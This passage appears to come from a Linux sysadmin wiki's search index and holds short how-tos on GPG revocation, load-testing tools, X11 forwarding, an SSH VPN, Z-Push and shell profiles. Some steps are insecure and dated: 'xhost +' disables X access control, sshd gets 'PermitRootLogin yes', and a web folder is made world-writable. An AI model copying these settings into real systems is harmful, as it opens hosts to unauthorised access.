created 2008-01-06 ASCII armored output forced. Revocation certificate created. Move it to a medium you can hide; if Mallory gets access to this certificate, he can use it to make your key unusable. A good idea is to print this certificate and store it somewhere else, in case the medium becomes unreadable. But be careful: the printer system of your machine might store these data and make them available to others! There you go, your certificate has been created. Keep the text file carefully, because if someone uses it, they can invalidate your keys by notifying the server they no longer exist, even though that’s false!! We’ll see how to use it later…\nTo get back to our subject, we need to register on the key server. It’s very simple:\n$ gpg --keyserver pgp.mit.edu --send-keys A39D9E94 gpg: sending key A39D9E94 to hkp server pgp.mit.edu There you go, your key has been exported to the key server. You can go admire it on pgp.mit.edu by typing your 8-digit ID preceded by ‘0x’ in the String field, or your name, email address, etc. For former president Jacques Chirac:\nhttp://pgp.mit.edu:11371/pks/lookup?op=get\u0026search=0xA4723848 Revoking Your Key on the Key Server linkIf, as mentioned above, you no longer use your keys for some reason (compromised by someone who has your private key, you lost your password, etc.), you must notify the key server of this revocation!\nTo do this, use the revocation file you created above, and import it into your keyring with the command:\ngpg --import revoc_username@domain.com.txt Check that your keyring has correctly registered the revocation by listing your keys:\ngpg --list-keys Your key should now be marked as [revoked]. You can then send it back to the key server to update it:\ngpg --keyserver pgp.mit.edu --send-keys A39D9E94 There you go, your key is revoked, and therefore unusable. You can now delete your public and private keys from your keyring. Delete the secret key first:\ngpg --delete-secret-keys username@domain.com then the public key(s) attached:\ngpg --delete-keys username@domain.com Usage linkNow, use your favorite software to encrypt your emails. Send your public key to your friends as well so they can easily decrypt them :-)\nResources linkhttps://gpglinux.free.fr/\nGnuPG - for more confidentiality\n"
            }
        );
    index.add(
            {
                id:  612 ,
                href: "\/Noyau_et_r%C3%A9seau_:_repousser_les_limites_de_la_connectivit%C3%A9\/",
                title: "Kernel and Network: Pushing the Limits of Connectivity",
                description: "This document explores advanced networking features in Linux kernel including bonding, TUN/TAP devices, traffic shaping, tunneling, VLANs, and QoS mechanisms.",
                content: "In this documentation, you will find information on:\nBonding Universal TUN/TAP device PPP Traffic Shaper IP Advanced router IP Tunneling and GRE IP ARP daemon, TCP Explicit Congestion Notification and TCP syncookie IPSEC, IPV6 and IPVS Vlan Tagging and Ethernet Bridging QOS As you’ll understand, this is a very comprehensive document, but it requires very good system and network knowledge:\nKernel and Network - How to Push the Limits of Connectivity\n"
            }
        );
    index.add(
            {
                id:  613 ,
                href: "\/Tester_le_load_sur_ses_serveurs_et_applications_web\/",
                title: "Testing Load on Servers and Web Applications",
                description: "A guide to different tools for load testing web servers and applications, comparing curl-loader, httperf, Siege, and Tsung.",
                content: "Introduction linkA good way to see how your Web applications and server will behave under high load is by testing them with a simulated load. We tested several free software tools that do such testing to see which work best for what kinds of sites.\nIf you leave out the load-testing packages that are no longer maintained, non-free, or fail the installation process in some obscure way, you are left with five candidates: curl-loader, httperf, Siege, Tsung, and Apache JMeter.\ncurl-loader linkThe purpose of curl-loader is to “deliver a powerful and flexible open source testing solution as a real alternative to Spirent Avalanche and IXIA IxLoad.” It relies on the mature and flexible cURL library to manage requests, authentication, and sessions.\nBuilding the application is straightforward: download, untar, and make the code inside its directory. I had to add an #include to the file ip_secondary.c to make it build, probably due to some recent changes in the glibc headers. You also need to install the OpenSSL libraries and headers to compile and run curl-loader.\nGetting started takes a bit more effort. curl-loader’s configuration interface is split into two parts. The first part is a configuration file that contains the parameters for a specific scenario. Its simple format consists of newline-delimited variable assignments of the form VAR=VALUE. You can find a bunch of self-explanatory examples in the directory conf-examples in the curl-loader source tree. Because curl-loader can use multiple IP addresses to realistically simulate requests from different clients, you need to adjust the values for INTERFACE, CLIENTS_NUM_MAX, NETMASK, IP_ADDR_MIN, and IP_ADDR_MAX to suit your network environment. The number of maximum parallel clients must of course be supported by the IP address range you specify.\nThe second part is the command-line interface of the curl-loader binary. It offers one essential parameter, -f, to which you’re expected to pass the location of the scenario file you wish to use. The other arguments let you fine-tune the test run. For example, by default curl-loader will issue its requests from a single thread. While this helps conserve system resources and increase performance, it’s advisable to use the -t option to add one thread per additional CPU core you wish to utilize.\nA screen-oriented result display shows a synopsis of the test results, updated at regular intervals, and more detailed results are available in the log files curl-loader generates. The file with the .log extension contains information about any errors, while the .ctx file shows per-client statistics and the .txt file shows statistics over time.\nIf you’re looking for a utility similar to curl-loader but written in Python, check out Pylot. It comes with a GUI and uses XML as its configuration format.\nhttperf linkhttperf is a command-line single-thread load tester developed by Hewlett-Packard Labs.\nYou set the bulk of httperf’s configuration via command-line parameters. Configuration files play an auxiliary role if you wish to specify a session scenario.\nA sample invocation for a total of 5,000 connections, each one of which should try to issue 50 requests, looks like this:\nhttperf --server=localhost --uri=/ --num-conns=5000 --num-calls=50 The first line of output will show arguments that have been assigned their defaults because you haven’t specified them:\nhttperf --client=0/1 --server=localhost --port=80 --uri=/ \\ --send-buffer=4096 --recv-buffer=16384 \\ --num-conns=5000 --num-calls=50 Unlike curl-loader, httperf doesn’t keep you updated about the status of the test run, nor does it write detailed log files. It only shows a summary of the test results at the end of the test run. There’s a debugging switch that helps you see what it’s currently doing, but it has to be enabled at compile time.\nI like the fact that httperf lets you specify all parameters on the command line. This lets you prototype your load test quickly and then put the finished invocation into a shell script. Running different tests sequentially or in parallel is also a no-brainer.\nhttperf could be a little smarter in its interpretation of its command-line arguments, though. For example, the separation of the target URI into server and path parts seems unnecessary, plus the latter one is specified by the –uri option, which is a misnomer, as valid URIs may contain the server name as well.\nTry http_load if you want a simpler tool in the style of httperf.\nSiege linkSiege is similar to httperf in that it can be configured almost fully with command-line arguments. But Siege uses multiple concurrent threads to send its requests, has fewer low-level options than httperf, and is built to work with a list of URLs. It’s also easier to use than httperf because its options are named in a more straightforward way.\nA Siege run with default parameters can be as simple as\nsiege localhost However, this doesn’t access the full power of Siege, which is to test a list of URLs in a largely unpredictable way like a real user would. To gather URLs, Siege’s author offers the auxiliary program Sproxy. After installing, run it like this:\nsproxy -v -o urls.txt Sproxy will keep the terminal open and list all recorded URLs, plus write them to the file urls.txt for Siege.\nConfigure your browser to use localhost:9001 as an HTTP proxy. Then it’s time to start browsing your site, thereby letting Sproxy record information about the URLs for Siege.\nWhen you have gathered some URLs you would like to test, start the next test run like this:\nsiege -v --internet --file=urls.txt The –internet argument instructs Siege to hit the URLs in a random fashion, like a horde of surfers would.\nTsung linkTsung works in a way similar to using Siege with an URL file, but it offers more elaborate features, such as random user agents, session simulation, and dynamic data feedback. It also performs better by using Erlang’s Green Threads.\nThis comes at a price, though: Tsung doesn’t offer the ad-hoc command-line invocation we know from Siege, curl-loader, and httperf. You must either manually create a scenario file in ~/.tsung/tsung.xml or use the recording mode of Tsung, which works like Siege’s Sproxy:\nStart the Tsung recording proxy with tsung recorder, then visit the target URLs with localhost:8090 as proxy server. Open the newly created session record in ~/.tsung and edit the details of your scenario. Save it as ~/.tsung/tsung.xml. Use tsung start to start the test. Step two, the crafting of the configuration file, is the most difficult part. If you want to use the advanced features of Tsung you will definitely need to get acquainted with its format.\nAs an additional bonus, Tsung can also put PostgreSQL and Jabber servers under load.\nConclusion linkEach of these tools has its advantages and disadvantages. All are documented well, offer a painless installation, and run reliably.\nHere’s a possible decision path to find the right tool for your particular job: start out simple with Siege and see if you can get away with its simple performance and feature set. After that, try httperf, which has a slightly expanded feature set and runs faster. If you need to set up more complex scenarios, move on to curl-loader and Tsung, which have the largest feature sets and best performance, but especially Tsung takes time to get used to.\nApache JMeter is the only GUI-based application in the crowd. Its feature set is pretty impressive, offering some unique things like content pre- and postprocessors. You should give it a try if you prefer GUI apps.\n"
            }
        );
    index.add(
            {
                id:  614 ,
                href: "\/proc\/",
                title: "Understanding the Content of /proc",
                description: "Documentation to better understand the content of the /proc directory in Linux systems.",
                content: "Here’s a small documentation to help you better understand the mysterious /proc directory:\nThe proc directory\n"
            }
        );
    index.add(
            {
                id:  615 ,
                href: "\/Le_boot_de_Linux\/",
                title: "Linux Boot Process",
                description: "Documentation about the Linux boot process",
                content: "Here is a very comprehensive documentation, perhaps a bit too complex for beginners, but we all need to learn:\nLinux Boot Process\n"
            }
        );
    index.add(
            {
                id:  616 ,
                href: "\/Vino_:_le_serveur_VNC_par_excellence_pour_gnome\/",
                title: "Vino: The VNC Server of Excellence for GNOME",
                description: "Guide on using Vino, the user-friendly VNC server designed specifically for GNOME environments.",
                content: "Vncserver isn’t particularly user-friendly. That’s why for GNOME users, here’s Vino, which allows you to manage your VNC server simply and effectively:\nRemote Desktop Management with Vino\n"
            }
        );
    index.add(
            {
                id:  617 ,
                href: "\/Remplacer_une_RedHat_install%C3%A9e_par_une_Debian_sans_formater\/",
                title: "Replacing an installed RedHat with Debian without formatting",
                description: "How to replace a RedHat installation with Debian without formatting the disk or losing data",
                content: "Here is a fun documentation that explains how to remove the nasty RedHat distro and replace it with the sublime Debian distribution, all without deleting any data:\nHow To Remotely Install Debian Over A RH Based Distro\n"
            }
        );
    index.add(
            {
                id:  618 ,
                href: "\/Exporter_un_display_ou_forwarder_une_connexion_X11\/",
                title: "Export a Display or Forward an X11 Connection",
                description: "Guide on how to export displays or forward X11 connections to display GUI applications from one user or machine to another.",
                content: "Introduction linkSuch complicated names for something quite simple (though very practical).\nExporting a display allows one user to transfer GUI applications to another user Forwarding an X11 connection allows transferring GUI applications from one user to another In short, you might think they’re the same thing! But not exactly.\nExporting the Display linkLet’s say I’m connected as the user “deimos” and I launch a shell with the user “hostin”. I want to access the GUI of hostin. First, I authorize my deimos user to accept connections from any user:\n$ xhost + access control disabled, clients can connect from any host Now I want to know what my current display is:\n$ echo $DISPLAY :0.0 Then I connect as hostin and export my display to deimos:\n$ su - hostin $ export DISPLAY=:0.0 Now I just need to test with the hostin user:\n$ xclock Ta-da! The clock appears in my deimos session even though it’s launched by hostin :-)\nYou can also do this with a remote machine by specifying the host (here are the lines to replace for the host deimos.fr):\ndeimos: $ xhost + deimos.fr hostin:$ export DISPLAY=deimos.fr:0.0 Forwarding X linkWe can forward our little X window through SSH. For this, on the SSH server (/etc/ssh/sshd_config):\nX11Forwarding yes This line must be set to yes.\nThen, for the client to receive the window, you must connect with the -X argument:\n$ ssh -X xxx@mycompany.com $ xclock Once again, ta-da! :-)\nReferences linkCreate an X terminal\n"
            }
        );
    index.add(
            {
                id:  619 ,
                href: "\/find-and-du-locate-large-files-and-directories\/",
                title: "Locate Large Files and Directories",
                description: "How to use find and du commands to identify large files and directories consuming disk space",
                content: "Finding Large Directories linkTo find large directories, use the du command and sort the output.\nFor example, to output the 10 largest directories in /var, sorted in ascending size order, use the following command:\ndu -ko /var To avoid crossing file system boundaries, that is, to see the directory usage in / but not in the other mounted files systems (/var, /opt, and so on), add the d option to the du command:\ndu -kod /var Another super useful tool is ncdu. An ncurses disk usage viewer that provides a more user-friendly interface for navigating through directories and their sizes.\nncdu / Finding Large Files linkTo find large files, use the find command and sort the output.\nExample 1: To find all plain files (not block, character, symbolic links, and so on) in a file system larger than 200,000 512-byte blocks (approximately 100 Mbytes) and sort on field 7 (file size) while numerically ignoring leading blanks, do this: find / -size +200000 -type f -ls Example 2: To find all plain files (not block, character, symbolic links, and so on) in a /var file system larger than 1,000 512-byte blocks (approximately 500 Kbytes) and sort on field 7 (file size) while numerically ignoring leading blanks, do this: find /var -size +1000 -type f -ls "
            }
        );
    index.add(
            {
                id:  620 ,
                href: "\/SafeSquid_:_Mise_en_place_d\u0027un_proxy_filtrant_le_contenu\/",
                title: "SafeSquid: Setting Up a Content Filtering Proxy",
                description: "A guide to installing and configuring SafeSquid as a content filtering proxy to protect children from inappropriate internet content.",
                content: "Protecting children from inappropriate internet content is important, which is why tools like SafeSquid were created. Here’s some documentation:\nDocumentation on Deploying A Content Filtering Proxy Server To Distribute Controlled Internet Access With SafeSquid\nHow To Set Up Internet Access Control And Internet Filtering With SafeSquid Proxy Server\nHow To Control Access To Unwanted Websites Using URL Blacklist With SafeSquid Proxy Server\nHow To Control Download Of Files And Mime Types In SafeSquid Proxy Server\nHow To Block Ads And Banners In SafeSquid Proxy Server\nEnhance Security By Removing ActiveX Control Codes From Web Pages With SafeSquid Proxy Server\nHow To Block Cookies From Unwanted Websites With SafeSquid Proxy Server\nHow To Block WebPages Based On Keywords Or Phrases With SafeSquid Proxy Server\nHow To Control Or Block Instant Messengers With SafeSquid Proxy Server\n"
            }
        );
    index.add(
            {
                id:  621 ,
                href: "\/Pstree_:_lister_ses_process_sous_forme_d\u0027arbre\/",
                title: "Pstree: List Processes as a Tree",
                description: "Learn how to use the pstree command to visualize running processes in a tree format, showing parent-child relationships between processes.",
                content: "Introduction linkIf you’re using a system which has a lot of users, and you’d like to see who has started a particular script, daemon, or binary, then the pstree utility is very helpful. It draws a tree of all currently running processes - allowing you to see which processes are related.\nIn much the same way as the tree command isn’t likely to be generally useful, this command might seem a little pointless if you’re on a single-user machine, and you essentially start everything yourself. But even so it can be helpful to see where processes have come from.\nExamples linkThe most basic usage would look something like this:\n$ pstree init-+-apache2---10*[apache2] |-atd |-clamd |-cron |-events/0 |-exim4---exim4 |-freshclam |-getty |-gpg-agent |-khelper |-ksoftirqd/0 |-kthread-+-aio/0 | |-ata/0 | |-ata_aux | |-kblockd/0 | |-khubd | |-kjournald | |-kmirrord | |-kseriod | |-kswapd0 | |-2*[pdflush] | |-xenbus | `-xenwatch |-memcached |-migration/0 |-monit---{monit} |-munin-node |-mysqld_safe-+-logger | `-mysqld---16*[{mysqld}] |-pdnsd---4*[{pdnsd}] |-python |-qpsmtpd-forkser |-roundup-server---roundup-server |-screen---bash---irssi |-ssh-agent |-sshd-+-sshd---sshd---bash | `-sshd---sshd---bash---pstree |-syslog-ng `-watchdog/0 Here we can see several kernel processes running, (aio, ata, kseriod, etc.), several system daemons (syslog-ng, qpsmtpd, etc), as well as the ssh processes open for my current user.\nThere aren’t many ways of customizing the output of the display, although you can modify several things such as the display of command line arguments with:\npstree -a ... ... |-rinetd |-rpc.statd |-screen -S foo | `-bash |-screen -S bar | `-bash |-ssh-agent |-sshd |-syslog-ng -p /var/run/syslog-ng.pid |-udevd --daemon |-vino-session --sm-client-id default5 |-(watchdog/0) |-(watchdog/1) |-wnck-applet--oaf-activate-iid=OAFIID:GNOME_Wncklet_Factory |-xenconsoled | `-{xenconsoled} `-xenstored --pid-file /var/run/xenstore.pid For all the available options please read the manpage via “man pstree”.\nIf you don’t have the pstree command available then you may find it in the psmisc package, and it may be installed by apt-get, or aptitude in the usual manner.\nReferences linkhttp://www.debian-administration.org/articles/607\n"
            }
        );
    index.add(
            {
                id:  622 ,
                href: "\/Getmail_-_L%27alternative_%C3%A0_Fetchmail\/",
                title: "Getmail - An Alternative to Fetchmail",
                description: "Documentation about Getmail as an alternative to Fetchmail with a link to a PDF guide.",
                content: "Here’s documentation for those who are resistant to using Fetchmail:\nGetmail documentation\n"
            }
        );
    index.add(
            {
                id:  623 ,
                href: "\/Activer_Desactiver_ecran_veille_ligne_commande\/",
                title: "Enabling and Disabling Screen Savers from Command Line",
                description: "How to control screen power management using the command line in Linux for automatic display shutoff and power saving",
                content: "Introduction linkFor my job, we got nice 42-inch LCD screens for monitoring. However, these are Toshiba models that don’t even include a timer for turning the displays on and off. Instead of manually turning them on and off every morning, I preferred to use screen saver activation and deactivation features to manage them automatically.\nUsage linkHere’s a test that should turn off your screen, wait, and then turn it back on:\nxset dpms force off; sleep 5; xset dpms force on; xrandr -s 1; xrandr -s 0 To automate this process, you’ll want to create a crontab entry. You’ll need to add the following to your crontab:\nDISPLAY=:0.0 0 20 * * 1-5 xset dpms force off 0 8 * * 1-5 xset dpms force on This will turn off the displays at 8:00 PM and turn them back on at 8:00 AM, Monday through Friday.\n"
            }
        );
    index.add(
            {
                id:  624 ,
                href: "\/Cr%C3%A9er_un_VPN_avec_OpenSSH\/",
                title: "Creating a VPN with OpenSSH",
                description: "Learn how to create a VPN connection using OpenSSH to encrypt all traffic between two machines.",
                content: "1 Introduction linkMost SSH clients have the ability to perform local and remote port forwarding. This is a pretty neat use of SSH if you haven’t ever seen it before. OpenSSH can take it one step further and provide a full VPN solution encrypting all network traffic on all ports between two machines. This is pretty powerful stuff. This is useful for a quick-and-dirty way to encrypt all traffic between two machines. For a longer term solution, you might want to check out how to configure IPsec or use OpenVPN. All three solutions have some really cool features and benefits.\nOpenSSH is the most widely deployed open source SSH client/server solution today. Most Linux/BSD hosts I have encountered will use this as the client/server by default. Sun’s SSH packages are based off of the OpenSSH distribution with some tweaks and modifications, but it’s pretty close to OpenSSH’s implementation.\n2 Configuration link2.1 Verifications linkAnyways, to create a VPN tunnel between two machines, two variables in sshd_config need to be tweaked as well as the presence of the tun/tap kernel module. This kernel module is available on most Linux/BSD distributions. It may have to be compiled and inserted into the Solaris kernel, or you can download it here.\n$ uname -a Linux locutus 2.6.25-14.fc9.i686 #1 SMP Thu May 1 06:28:41 EDT 2008 i686 i686 i386 GNU/Linux $ lsmod | grep tun tun 11776 2 $ modinfo tun filename: /lib/modules/2.6.25-14.fc9.i686/kernel/drivers/net/tun.ko alias: char-major-10-200 license: GPL author: (C) 1999-2004 Max Krasnyansky description: Universal TUN/TAP device driver srcversion: 12C02361DF16200902CDE64 depends: vermagic: 2.6.25-14.fc9.i686 SMP mod_unload 686 4KSTACKS 2.2 SSH linkSo, the tun module has already been inserted into my running kernel. Next, set these two variables in sshd_config and have sshd re-read its configuration files…\n... PermitRootLogin yes PermitTunnel yes ... $ service sshd reload Reloading sshd: [ OK ] Make sure you don’t mess up sshd_config and reload the daemon as your only way to access the machine! Console access is always a good thing.\nNow all we need to do is to open the VPN tunnel itself. Here, I open a VPN tunnel to localhost (not really useful) but you can get the idea…\nssh -w any:any root@localhost The any:any defines the local:remote “tun” device. We could have put 0:1 here, (tun0 as the local, tun1 as the remote) but any:any takes care of it for us in case there are any pre-existing tun devices in use.) or 0:0 if we were accessing a real remote machine. (I can’t define two “tun0” devices on localhost)\n2.3 Network linkSo, after my SSH session connects, sure enough the tun devices exist..\n$ ifconfig tun0 tun0 Link encap:UNSPEC HWaddr 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 POINTOPOINT NOARP MULTICAST MTU:1500 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:500 RX bytes:0 (0.0 b) TX bytes:0 (0.0 b) $ ifconfig tun1 tun1 Link encap:UNSPEC HWaddr 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 POINTOPOINT NOARP MULTICAST MTU:1500 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:500 RX bytes:0 (0.0 b) TX bytes:0 (0.0 b) Now all we have to do is assign them some network addresses and let them know that its a point-to-point connection between the two…\n$ ifconfig tun0 10.0.0.10 pointopoint 10.0.0.11 $ ifconfig tun1 10.0.0.11 pointopoint 10.0.0.10 $ ifconfig tun0 tun0 Link encap:UNSPEC HWaddr 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 inet addr:10.0.0.10 P-t-P:10.0.0.11 Mask:255.255.255.255 UP POINTOPOINT RUNNING NOARP MULTICAST MTU:1500 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:500 RX bytes:0 (0.0 b) TX bytes:0 (0.0 b) $ ifconfig tun1 tun1 Link encap:UNSPEC HWaddr 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 inet addr:10.0.0.11 P-t-P:10.0.0.10 Mask:255.255.255.255 UP POINTOPOINT RUNNING NOARP MULTICAST MTU:1500 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:500 RX bytes:0 (0.0 b) TX bytes:0 (0.0 b) Nice! Now all network traffic between the machines using those newly created addresses will be tunneled through SSH! Could this be a solution for NFSv3 and firewalls? ;-)\nIf there are multiple machines on the “other side” of the VPN that you would want to connect to, you will also need to add a route..\n$ route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.10 tun0 $ netstat -rn Kernel IP routing table Destination Gateway Genmask Flags MSS Window irtt Iface 10.0.0.11 0.0.0.0 255.255.255.255 UH 0 0 0 tun0 10.0.0.10 0.0.0.0 255.255.255.255 UH 0 0 0 tun1 10.0.0.0 10.0.0.10 255.255.255.0 UG 0 0 0 tun0 So any traffic destined for 10.0.0.0/24 is gonna go out tun0 to be routed onwards and upwards.\nWe’ve also got to set up an arp entry..\n$ arp -sD 10.0.0.11 eth0 pub $ arp -an ? (10.0.0.11) at * PERM PUP on eth0 Ryan McGuire wrote a pretty cool blog entry about not only this feature, but some other really neat things with OpenSSH. I based a lot of this article after learning them from his site. Check out his python script that will automate a lot of this for you. Thanks Ryan!\n3 Resources linkhttp://prefetch.net/blog/index.php/2008/06/26/opensshs-vpn/\n"
            }
        );
    index.add(
            {
                id:  625 ,
                href: "\/Z-Push_:_Avoir_un_serveur_ActiveSync_avec_Postfix_(ou_comment_faire_du_push_mail)\/",
                title: "Z-Push: Setting Up an ActiveSync Server with Postfix (or How to Set Up Push Mail)",
                description: "Learn how to set up a push mail server using Z-Push with Postfix as an alternative to Microsoft Exchange, compatible with iPhone and Windows Mobile devices.",
                content: "Introduction linkPush server technology is very trendy nowadays, especially with the iPhone which now allows connections (just like Windows Mobile) to an Exchange-like push server. The problem is that for the open-source world, Exchange is not an option. I found a well-developed project on SourceForge called Z-Push that works perfectly with Postfix.\nInstallation linkWe’ll download the latest version from https://z-push.sourceforge.net and extract it to /var/www:\ntar zxvf z-push-.tar.gz -C /var/www Now we’ll apply the proper permissions:\nchmod 777 /var/www/z-push/state chmod 755 /var/www/z-push/state chown www-data. /var/www/z-push Configuration linkApache linkWe need to configure Apache to redirect /Microsoft-Server-ActiveSync to /var/www/z-push/index.php. There are two options:\nUsing alias: Alias /Microsoft-Server-ActiveSync /var/www/z-push/index.php Using VirtualHost Add this to your virtualhost configuration (/etc/apache2/sites-enabled/000-default):\nOptions Indexes FollowSymLinks MultiViews Order allow,deny allow from all RedirectMatch ^/Microsoft-Server-ActiveSync /var/www/z-push/index.php "
            }
        );
    index.add(
            {
                id:  626 ,
                href: "\/Php-syslog-ng_:_Interpr%C3%A9tation_des_logs_Syslog-ng_dans_une_interfa%C3%A7e_web\/",
                title: "PHP-syslog-ng: Interpretation of Syslog-ng logs in a web interface",
                description: "How to install and configure PHP-syslog-ng to analyze and interpret syslog logs in a web interface",
                content: "Introduction linkphp-syslog-ng is a web application that allows you to format, search, and interpret logs. For searching, it requires logs to be in an SQL database, and for log interpretation, it’s specifically designed for Cisco logs.\nNote: Before continuing, you’ll need a web server like Apache with PHP module installed. You’ll also need the MySQL module for PHP.\nInstallation linkLet’s use the latest version:\ncd /var/www wget http://php-syslog-ng.googlecode.com/files/php-syslog-ng-2.9.8.tgz Now let’s extract it:\ntar -xzvf php-syslog-ng-2.9.8.tgz If we want graphs, we need to install Microsoft fonts:\napt-get install msttcorefonts Configuration linkSimply go to the page http://localhost/php-syslog-ng/html/ and fill in the correct information. The installer will prepare your MySQL database. After installation, you can delete the “installation” folder and modify the configuration file located at /var/www/php-syslog-ng/html/config/config.php whenever you want.\nLog Rotation linkLet’s edit the configuration file /var/www/php-syslog-ng/html/config/config.php and modify this line to keep 6 months of logs:\ndefine('LOGROTATERETENTION', 180); Here, we want all logs older than 180 days to be deleted. However, we need to make sure this is configured in root’s crontab. Edit it and add these lines:\n@daily php /var/www/php-syslog-ng/scripts/logrotate.php \u003e\u003e /var/log/php-syslog-ng/logrotate.log @daily find /var/www/php-syslog-ng/html/jpcache/ -atime 1 -exec rm -f '{}' ';' */5 * * * * php /var/www/php-syslog-ng/scripts/reloadcache.php \u003e\u003e /var/log/php-syslog-ng/reloadcache.log Also create the log folder if it doesn’t exist:\nmkdir -p /var/log/php-syslog-ng/ "
            }
        );
    index.add(
            {
                id:  627 ,
                href: "\/FTP_:_Automatiser_des_transferts\/",
                title: "FTP: Automate Transfers",
                description: "How to automate FTP transfers using shell scripts and command line tools like ftp and ncftp.",
                content: "Introduction linkIt’s sometimes convenient to automate certain tasks like uploading files or other operations.\nFTP linkWith the universal ftp command, here’s an example that you can place in a shell script:\ntransfertFile() { inputFile=$1 ftp -n \u003c"
            }
        );
    index.add(
            {
                id:  628 ,
                href: "\/Mise_en_place_d%27un_serveur_de_Home_sp%C3%A9cialis%C3%A9_syst%C3%A8mes_Unix\/",
                title: "Setting up a Unix systems specialized Home server",
                description: "Learn how to set up a dedicated Home server specialized for Unix systems with centralized accounts, shared profiles, and quota management.",
                content: "Introduction linkThis article will show how to have a simultaneous dedicated profile on multiple machines.\nHere are the goals of this tutorial:\nAccount centralization with LDAP (this should already be done). Each user will have a single personal unix profile on every unix server. The profile is the same everywhere with a share system. They will have paths, aliases and environment vars easier to set via a perl script. The profile will be the same for every user (global environment) plus their personal customizations. Users on Windows will have their Unix profile on a shared drive. A special easy environment for Java is also possible. Set global environment linkGlobal Profile linkThis file will be loaded every time when a user logs on. You can add anything if you want it to be loaded. Here is the /etc/profile file:\n# /etc/profile: system-wide .profile file for the Bourne shell (sh(1)) # and Bourne compatible shells (bash(1), ksh(1), ash(1), ...). # If not running interactively, don't do anything [ -z \"$PS1\" ] \u0026\u0026 return # don't put duplicate lines in the history. See bash(1) for more options export HISTCONTROL=ignoredups # check the window size after each command and, if necessary, # update the values of LINES and COLUMNS. shopt -s checkwinsize # make less more friendly for non-text input files, see lesspipe(1) [ -x /usr/bin/lesspipe ] \u0026\u0026 eval \"$(lesspipe)\" # Comment in the above and uncomment this below for a color prompt PS1='\\[\\033[01;37m\\][\\[\\033[01;32m\\]`date +%D` \\[\\033[01;35m\\]\\t\\[\\033[01;37m\\]] - \\[\\033[01;33m\\][\\w]\\n\\[\\033[01;34m\\]\\u\\[\\033[01;31m\\]@\\[\\033[01;34m\\]\\h\\[\\033[00m\\] \\[\\033[01;31m\\]\\$\\[\\033[00;37m\\] ' ####################################### # Default Variables and Environnement # ####################################### # Uname system export MYSYSTEM=`uname` # Define Path PATH=\"/usr/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/bin\" FULLPATH=$PATH # Linux if [ $MYSYSTEM = \"Linux\" ] ; then CORE_NUMBER=`grep processor /proc/cpuinfo | wc | awk '{ print $1 }'` RAM_INFO=`free -m | grep \"Mem:\" | awk '{ print $2 \"Mo / Free :\", $3\"Mo\" }'` fi # Solaris if [[ $MYSYSTEM = \"SunOS\" \u0026\u0026 -d /usr/openwin/bin/ ]] ; then PATH=\"$PATH:/usr/openwin/bin/:/usr/X11/bin:/opt/csw/bin\" FULLPATH=$FULLPATH:$PATH CORE_NUMBER=`psrinfo | wc | awk '{ print $1 }'` RAM_MO=`echo \"`vmstat | grep -v [a-z] | awk '{ print $5 }'`/1024\" | bc` RAM_INFO=`echo `prtconf | grep \"Memory size\" | awk '{ print $3 }'`\"Mo / Free : \"$RAM_MO Mo` fi # Cygwin if [ $MYSYSTEM = \"CYGWIN*\" ] ; then export TERM=cygwin else export TERM=xterm-color fi export PATH usernames=( $(cut -d: -f1 /etc/passwd) ) groups=( $(cut -d: -f1 /etc/group) ) case \"$TERM\" in xterm*|rxvt|linux|cygwin) ;; *) nocolor=yes ;; esac # Set locales if [ $MYSYSTEM = \"SunOS\" ] ; then export LANGUAGE=fr_FR.ISO8859-15 export LC_ALL=fr_FR.ISO8859-15 export LANG=fr_FR.ISO8859-15 else export LANGUAGE=fr_FR@euro export LC_ALL=fr_FR@euro export LANG=fr_FR@euro fi export LESSCHARSET=latin9 export MINICOM=\"-c on\" export LESS=\"-S -g\" GCHECK=60 WATCHFMT=\"%n has %a %l from %M\" # CVS export CVS_RSH=/usr/bin/ssh export CVSROOT=:ext:user@host:/var/lib/cvs # History export HISTSIZE=5000 export HISTFILE=$HOME/.bash_history export SAVEHIST=1 # Defaut editor export EDITOR=vim export LISTMAX=0 # Use most if possible if [[ -x /usr/bin/most || -x /opt/local/bin/most ]] ; then export PAGER=most else export PAGER=more fi ################# # Environnement # ################# # Usefull alias alias utar=\"tar -xvzf\" alias ..='cd ..' alias ...='cd ../..' alias uu='source /etc/profile \u0026\u003e /dev/null' # ls if [ $MYSYSTEM = \"Linux\" ] ; then alias ls='ls --color=auto' alias l='ls --color=auto -lg' alias ll='ls --color=auto -lag | $PAGER' fi # Graphical User Informations echo \"\" echo \" You're connected has $USER on $HOSTNAME machine.\" echo \" Connected users : `who -q | grep \"=\" | awk -F'=' '{ print $2 }'`\" echo \" Host OS : $MYSYSTEM - `uname -m`\" echo \"\" echo \" Host CPU Core(s) : $CORE_NUMBER\" echo \" Host RAM : Total : $RAM_INFO\" # Personals mycompany users environnements if [ -d ~/mycompany_bash ] ; then # Generate a correct file in /tmp dir for personal_env in `ls ~/mycompany_bash/` ; do /etc/mycompany_skel/mycompany_alias_env.pl $personal_env done # Load the environnement . /tmp/$USER\"_genprofil\" || echo \"Error while trying to load your personnal environnement\" rm -f /tmp/$USER\"_genprofil\" else # Create the environnement for the new user cp -Rf /etc/skel/mycompany_bash ~/mycompany_bash chown -Rf $USER:Team ~/mycompany_bash fi if [ $JAVA_HOME ] ; then export PATH=$PATH_PERSO:$JAVA_HOME:$FULLPATH else export PATH=$PATH_PERSO:$FULLPATH fi # enable programmable completion features (you don't need to enable # this, if it's already enabled in /etc/bash.bashrc and /etc/profile # sources /etc/bash.bashrc). if [ -f /etc/bash_completion ]; then . /etc/bash_completion fi umask 022 ### Easier env, alias and path Script With this script, users could have a folder called mycompany_bash with their own aliases, env or path. They only have to add a file in this folder which should contain: - alias: for an aliases file - env: for an environment file - path: the path file The syntax on 